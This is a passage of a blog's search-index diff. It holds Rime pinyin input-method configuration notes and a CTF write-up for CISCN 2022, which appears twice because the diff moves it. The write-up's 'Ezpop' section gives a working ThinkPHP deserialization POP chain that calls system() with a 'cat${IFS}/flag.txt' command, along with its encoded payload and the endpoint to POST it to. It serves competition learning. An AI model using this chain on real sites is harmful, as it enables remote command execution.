在設計者安排下鳩佔鵲巢，尖音i只好雙寫了</span></span><br><span class="line">    <span class="comment">#- derive/^qi$/cii/</span></span><br><span class="line">    <span class="comment">#- derive/^xi$/sii/</span></span><br><span class="line">    <span class="comment">#- derive/^ji/zi/</span></span><br><span class="line">    <span class="comment">#- derive/^qi/ci/</span></span><br><span class="line">    <span class="comment">#- derive/^xi/si/</span></span><br><span class="line">    <span class="comment">#- derive/^ju/zv/</span></span><br><span class="line">    <span class="comment">#- derive/^qu/cv/</span></span><br><span class="line">    <span class="comment">#- derive/^xu/sv/</span></span><br><span class="line">    <span class="comment"># 韻母部份，只能從大面上覆蓋</span></span><br><span class="line">    <span class="comment">#- derive/^([bpm])o$/$1eh/          # bo =&gt; beh, ...</span></span><br><span class="line">    <span class="comment">#- derive/(^|[dtnlgkhzcs]h?)e$/$1eh/  # ge =&gt; geh, se =&gt; sheh, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])uo$/$1ue/         # guo =&gt; gue, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])e$/$1uo/          # he =&gt; huo, ...</span></span><br><span class="line">    <span class="comment">#- derive/([uv])e$/$1o/             # jue =&gt; juo, lve =&gt; lvo, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fei$/fi/                 # fei =&gt; fi</span></span><br><span class="line">    <span class="comment">#- derive/^wei$/vi/                 # wei =&gt; vi</span></span><br><span class="line">    <span class="comment">#- derive/^([nl])ei$/$1ui/          # nei =&gt; nui, lei =&gt; lui</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])un$/$1vn/       # lun =&gt; lvn, zun =&gt; zvn, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])ong$/$1iong/    # long =&gt; liong, song =&gt; siong, ...</span></span><br><span class="line">    <span class="comment"># 這個辦法雖從拼寫上做出了區分，然而受詞典制約，候選字仍是混的。</span></span><br><span class="line">    <span class="comment"># 只有真正的方音輸入方案纔能做到！但「反模糊音」這個玩法快速而有效！</span></span><br><span class="line">    <span class="comment"># 模糊音定義先於簡拼定義，方可令簡拼支持以上模糊音</span></span><br><span class="line">    - abbrev/^([a-z]).+$/$<span class="number">1</span>/           <span class="comment"># 簡拼（首字母）</span></span><br><span class="line">    - abbrev/^([zcs]h).+$/$<span class="number">1</span>/          <span class="comment"># 簡拼（zh, ch, sh）</span></span><br><span class="line">    <span class="comment"># 以下是一組容錯拼寫，《漢語拼音》方案以前者爲正</span></span><br><span class="line">    - derive/^([nl])ve$/$1ue/          <span class="comment"># nve = nue, lve = lue</span></span><br><span class="line">    - derive/^([jqxy])u/$1v/           <span class="comment"># ju = jv,</span></span><br><span class="line">    - derive/un$/uen/                  <span class="comment"># gun = guen,</span></span><br><span class="line">    - derive/ui$/uei/                  <span class="comment"># gui = guei,</span></span><br><span class="line">    - derive/iu$/iou/                  <span class="comment"># jiu = jiou,</span></span><br><span class="line">    <span class="comment"># 自動糾正一些常見的按鍵錯誤</span></span><br><span class="line">    - derive/([aeiou])ng$/$1gn/        <span class="comment"># dagn =&gt; dang</span></span><br><span class="line">    - derive/([dtngkhrzcs])o(u|ng)$/$1o/  <span class="comment"># zho =&gt; zhong|zhou</span></span><br><span class="line">    - derive/ong$/on/                  <span class="comment"># zhonguo =&gt; zhong guo</span></span><br><span class="line">    - derive/ao$/oa/                   <span class="comment"># hoa =&gt; hao</span></span><br><span class="line">    - derive/([iu])a(o|ng?)$/a$<span class="number">1</span>$<span class="number">2</span>/    <span class="comment"># tain =&gt; tian</span></span><br><span class="line">  <span class="comment"># 分尖團後 v =&gt; ü 的改寫條件也要相應地擴充：</span></span><br><span class="line">  <span class="comment">#&#x27;translator/preedit_format&#x27;:</span></span><br><span class="line">  <span class="comment">#  - &quot;xform/([nljqxyzcs])v/$1ü/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+        <tag>open source</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WRITEUP FRO FIFTEENTH CISCN (PART)</title>
+    <url>/2022/05/29/ciscn15/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="4-调查问卷"><a href="#4-调查问卷" class="headerlink" title="4. 调查问卷"></a>4. 调查问卷</h2><img width="273" height="152" src="/img/ciscn15/clip_image006.png" v:shapes="图片_x0020_6">
+
+<img width="381" height="145" src="/img/ciscn15/clip_image008.png" v:shapes="图片_x0020_1">
+
+<ul>
+<li><strong>flag值：flag{Thanksforplayingourgames}</strong></li>
+</ul>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-签到电台"><a href="#1-签到电台" class="headerlink" title="1. 签到电台"></a>1. 签到电台</h2><p>此题与摩斯电码关系不大</p>
+<ol>
+<li><p>输入<code>···</code>启动后BurpSuit抓个包</p>
+</li>
+<li><p>可以直接进行url<code>?msg=xxxx</code>传递</p>
+</li>
+<li><p>前往公众号获取提示</p>
+<p> <img src="/img/ciscn15/791b051d1069024a94daeb6088ae9d85.png" alt="791b051d1069024a94daeb6088ae9d85.png"></p>
+</li>
+<li><p>按照网址提供的<strong>密码本</strong>前28位，与7个电码逐位相加mod10</p>
+<p> <img src="/img/ciscn15/11d9f4b5684c6db2c80405469cd555e7.png" alt="11d9f4b5684c6db2c80405469cd555e7.png"></p>
+</li>
+<li><p>回到repeater，得到flag</p>
+<p> <img src="/img/ciscn15/d371e53295e989db066669aa100f4d76.png" alt="d371e53295e989db066669aa100f4d76.png"></p>
+</li>
+</ol>
+<ul>
+<li><strong>flag：flag{2adc3f3c-0264-4bb5-bea4-fec4d788bb23}</strong><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4. Ezpop"></a>4. Ezpop</h2></li>
+<li>thinkphp 框架</li>
+</ul>
+<ol>
+<li><p>发现网址目录下有源码<code>/www.zip</code>，下载下来分析</p>
+</li>
+<li><p>根据<code>/public/index.php</code>源码和注释提示构造 payload</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">	<span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">		<span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>运行一下php代码得到</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure></li>
+<li><p>POST方式提交到<code>/index.php/index/test</code>得到flag</p>
+<p> <img src="/img/ciscn15/09b19555a94fb43eed78855b59ef272c.png" alt="09b19555a94fb43eed78855b59ef272c.png"></p>
+</li>
+</ol>
+<ul>
+<li><strong>flag: flag{85d52d33-9e9b-42a7-9970-fbe62641acf3}</strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>ciscn</tag>
       </tags>
   </entry>
   <entry>
@@ -1347,9 +1460,9 @@
       </categories>
       <tags>
         <tag>网络空间安全</tag>
-        <tag>安全漏洞</tag>
         <tag>0day</tag>
         <tag>Stack overflow</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1681,107 +1794,6 @@
       <tags>
         <tag>程序开发安全</tag>
         <tag>编程语言</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WRITEUP FRO FIFTEENTH CISCN (PART)</title>
-    <url>/2022/05/29/ciscn15/</url>
-    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="4-调查问卷"><a href="#4-调查问卷" class="headerlink" title="4. 调查问卷"></a>4. 调查问卷</h2><img width="273" height="152" src="/img/ciscn15/clip_image006.png" v:shapes="图片_x0020_6">
-
-<img width="381" height="145" src="/img/ciscn15/clip_image008.png" v:shapes="图片_x0020_1">
-
-<ul>
-<li><strong>flag值：flag{Thanksforplayingourgames}</strong></li>
-</ul>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-签到电台"><a href="#1-签到电台" class="headerlink" title="1. 签到电台"></a>1. 签到电台</h2><p>此题与摩斯电码关系不大</p>
-<ol>
-<li><p>输入<code>···</code>启动后BurpSuit抓个包</p>
-</li>
-<li><p>可以直接进行url<code>?msg=xxxx</code>传递</p>
-</li>
-<li><p>前往公众号获取提示</p>
-<p> <img src="/img/ciscn15/791b051d1069024a94daeb6088ae9d85.png" alt="791b051d1069024a94daeb6088ae9d85.png"></p>
-</li>
-<li><p>按照网址提供的<strong>密码本</strong>前28位，与7个电码逐位相加mod10</p>
-<p> <img src="/img/ciscn15/11d9f4b5684c6db2c80405469cd555e7.png" alt="11d9f4b5684c6db2c80405469cd555e7.png"></p>
-</li>
-<li><p>回到repeater，得到flag</p>
-<p> <img src="/img/ciscn15/d371e53295e989db066669aa100f4d76.png" alt="d371e53295e989db066669aa100f4d76.png"></p>
-</li>
-</ol>
-<ul>
-<li><strong>flag：flag{2adc3f3c-0264-4bb5-bea4-fec4d788bb23}</strong><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4. Ezpop"></a>4. Ezpop</h2></li>
-<li>thinkphp 框架</li>
-</ul>
-<ol>
-<li><p>发现网址目录下有源码<code>/www.zip</code>，下载下来分析</p>
-</li>
-<li><p>根据<code>/public/index.php</code>源码和注释提示构造 payload</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">	<span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">		<span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li><p>运行一下php代码得到</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure></li>
-<li><p>POST方式提交到<code>/index.php/index/test</code>得到flag</p>
-<p> <img src="/img/ciscn15/09b19555a94fb43eed78855b59ef272c.png" alt="09b19555a94fb43eed78855b59ef272c.png"></p>
-</li>
-</ol>
-<ul>
-<li><strong>flag: flag{85d52d33-9e9b-42a7-9970-fbe62641acf3}</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>ciscn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RIME CONFIG GUIDE</title>
-    <url>/2021/12/25/RIME-CONfIG/</url>
-    <content><![CDATA[<h1 id="x2F-rime-x2F-build-x2F-ibus-rime-yaml"><a href="#x2F-rime-x2F-build-x2F-ibus-rime-yaml" class="headerlink" title="&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml"></a>&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml</h1><p>ibus-rime候选横竖列文件</p>
-<h1 id="x2F-rime-x2F-default-custom-yaml"><a href="#x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;rime&#x2F;default.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;menu/page_size&quot;</span>: <span class="number">7</span> <span class="comment">#每页候选词个数</span></span><br><span class="line">	<span class="string">&quot;ascii_composer/switch_key/Shift_L&quot;</span>: commit_code <span class="comment">#左shift提交字母</span></span><br><span class="line">	<span class="string">&quot;style/horizontal&quot;</span>: true      <span class="comment"># 候選橫排</span></span><br></pre></td></tr></table></figure>
-<h1 id="x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	switches:                   <span class="comment"># 注意縮進</span></span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: <span class="number">0</span>                <span class="comment"># reset 0 的作用是當從其他輸入方案切換到本方案時，</span></span><br><span class="line">	states: [ 中文, 西文 ]  <span class="comment"># 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span></span><br><span class="line">	- name: full_shape        <span class="comment"># 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span></span><br><span class="line">	states: [ 半角, 全角 ]  <span class="comment"># 而全／半角則可沿用之前方案中的用法。</span></span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: <span class="number">1</span>                <span class="comment"># 增加這一行：默認啓用「繁→簡」轉換。</span></span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure>
-<h1 id="weasel-custom-yaml"><a href="#weasel-custom-yaml" class="headerlink" title="weasel.custom.yaml"></a>weasel.custom.yaml</h1><h2 id="P站配色主题风格"><a href="#P站配色主题风格" class="headerlink" title="P站配色主题风格"></a>P站配色主题风格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line"><span class="comment"># rime输入法自定义P站配色风格主题</span></span><br><span class="line">	<span class="string">&quot;style/layout/round_corner&quot;</span>:<span class="number">5</span></span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>::p</span><br><span class="line">	  <span class="string">&quot;style/horizontal&quot;</span>: true  <span class="comment">#横向排列</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/:p&quot;</span>:</span><br><span class="line">		author:BLACK</span><br><span class="line">		name::p</span><br><span class="line">		back_color:<span class="number">0x000000</span></span><br><span class="line">		label_color:<span class="number">0xffffff</span></span><br><span class="line">		border_color:<span class="number">0x000000</span></span><br><span class="line">		text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_back_color:<span class="number">0x009bff</span></span><br><span class="line">		candidate_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_candidate_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_candidate_back_color:<span class="number">0x009bff</span></span><br><span class="line">		comment_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_lable_color:<span class="number">0x000000</span></span><br></pre></td></tr></table></figure>
-<pre><code>• 输入法代号：ibus-rime
-• 用户资料夹： ~/.config/ibus/rime/
-• 共享资料夹： /usr/share/rime-data/
-</code></pre>
-<p>共享资料夹包含预设输入方案的源文件。 这些文件属于 Rime 所发行软件的一部份，在访问权限控制较严格的系统上对用户是只读的，因此谢绝软件版本更新以外的任何修改—— 一旦用户修改这里的文件，很可能影响后续的软件升级或在升级时丢失数据。<br>在「部署 Rime」操作时，将用到这里的输入方案源文件、并结合用户定制的内容来编译预设输入方案。</p>
-<h1 id="「用户资料夹」数据说明"><a href="#「用户资料夹」数据说明" class="headerlink" title="「用户资料夹」数据说明"></a>「用户资料夹」数据说明</h1><h2 id="用户资料夹则包含为用户准备的内容"><a href="#用户资料夹则包含为用户准备的内容" class="headerlink" title="用户资料夹则包含为用户准备的内容"></a>用户资料夹则包含为用户准备的内容</h2><pre><code>• 〔全局設定〕 default.yaml
-• 〔發行版設定〕 ibus-rime.yaml
-• 〔預設輸入方案副本〕 &lt;方案标识&gt;.schema.yaml ibus-rime.schema.yaml
-• ※〔安裝信息〕 installation.yaml
-• ※〔用戶狀態信息〕 user.yaml
-</code></pre>
-<h2 id="编译输入方案所产出的二进制文件："><a href="#编译输入方案所产出的二进制文件：" class="headerlink" title="编译输入方案所产出的二进制文件："></a>编译输入方案所产出的二进制文件：</h2><pre><code>• 〔Rime 棱鏡〕 &lt;方案标识&gt;.prism.bin
-• 〔Rime 固態詞典〕 &lt;词典名&gt;.table.bin
-• 〔Rime 反查詞典〕 &lt;词典名&gt;.reverse.bin
-</code></pre>
-<h2 id="记录用户写作习惯的文件"><a href="#记录用户写作习惯的文件" class="headerlink" title="记录用户写作习惯的文件"></a>记录用户写作习惯的文件</h2><pre><code>• ※〔用戶詞典〕 &lt;词典名&gt;.userdb.kct
-• ※〔用戶詞典快照〕 &lt;词典名&gt;.userdb.txt、&lt;词典名&gt;.userdb.kct.snapshot 見於同步文件夾
-</code></pre>
-<h2 id="用户自己设定的"><a href="#用户自己设定的" class="headerlink" title="用户自己设定的"></a>用户自己设定的</h2><pre><code>• ※〔用戶對全局設定的定製信息〕 default.custom.yaml
-• ※〔用戶對預設輸入方案的定製信息〕 &lt;方案标识&gt;.custom.yaml
-• ※〔用戶自製輸入方案〕及配套的詞典源文件
-</code></pre>
-<p>注：以上标有 ※ 号的文件，包含用户资料，清理文件时要注意备份！</p>
-<h1 id="词库管理"><a href="#词库管理" class="headerlink" title="词库管理"></a>词库管理</h1><ol>
-<li>导入搜狗词库：<ol>
-<li>luna_pinyinn.sogou.dict.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rime dictionary</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">---</span><br><span class="line">name: luna_pinyin.sogou</span><br><span class="line">version: <span class="string">&quot;2015.12.24&quot;</span></span><br><span class="line">sort: by_weight</span><br><span class="line">use_preset_vocabulary: true</span><br><span class="line">import_tables:</span><br><span class="line">  - luna_pinyin</span><br><span class="line">...</span><br><span class="line"><span class="comment">#######后面为词库内容#########</span></span><br></pre></td></tr></table></figure></li>
-<li>luna_pinyin_simp.custom.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">translator/dictionary: luna_pinyin.sogou  <span class="comment">#导入搜狗词库</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<p>2.特殊字符定义：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;recognizer/patterns/punct&#x27;</span>: <span class="string">&quot;^/[a-z]*$&quot;</span>  <span class="comment">#可以使symbols中的‘/hj’‘/fh’等命令</span></span><br><span class="line"><span class="string">&#x27;punctuator/import_preset&#x27;</span>: symbols       <span class="comment">#将标点设置默认为&#x27;symbols.yaml&#x27;文件</span></span><br><span class="line"><span class="string">&quot;switches/@0/reset&quot;</span>: <span class="number">1</span>  <span class="comment"># 初始的 ascii mode 设置为「西文」</span></span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>糢糊音定义：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;speller/algebra&#x27;</span>:</span><br><span class="line">    - erase/^xx$/                      <span class="comment"># 第一行保留</span></span><br><span class="line">    <span class="comment"># 模糊音定義</span></span><br><span class="line">    <span class="comment"># 需要哪組就刪去行首的 # 號，單雙向任選</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])h/$1/             # zh, ch, sh =&gt; z, c, s</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])([^h])/$1h$2/     # z, c, s =&gt; zh, ch, sh</span></span><br><span class="line">    <span class="comment">#- derive/^n/l/                     # n =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^l/n/                     # l =&gt; n</span></span><br><span class="line">    <span class="comment"># 這兩組一般是單向的</span></span><br><span class="line">    <span class="comment">#- derive/^r/l/                     # r =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^ren/yin/                 # ren =&gt; yin, reng =&gt; ying</span></span><br><span class="line">    <span class="comment">#- derive/^r/y/                     # r =&gt; y</span></span><br><span class="line">    <span class="comment"># 下面 hu &lt;=&gt; f 這組寫法複雜一些，分情況討論</span></span><br><span class="line">    <span class="comment">#- derive/^hu$/fu/                  # hu =&gt; fu</span></span><br><span class="line">    - derive/^hong$/feng/              <span class="comment"># hong =&gt; feng</span></span><br><span class="line">    - derive/^hu([<span class="keyword">in</span>])$/fe$<span class="number">1</span>/          <span class="comment"># hui =&gt; fei, hun =&gt; fen</span></span><br><span class="line">    <span class="comment">#- derive/^hu([ao])/f$1/            # hua =&gt; fa, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fu$/hu/                  # fu =&gt; hu</span></span><br><span class="line">    - derive/^feng$/hong/              <span class="comment"># feng =&gt; hong</span></span><br><span class="line">    <span class="comment">#- derive/^fe([in])$/hu$1/          # fei =&gt; hui, fen =&gt; hun</span></span><br><span class="line">    <span class="comment">#- derive/^f([ao])/hu$1/            # fa 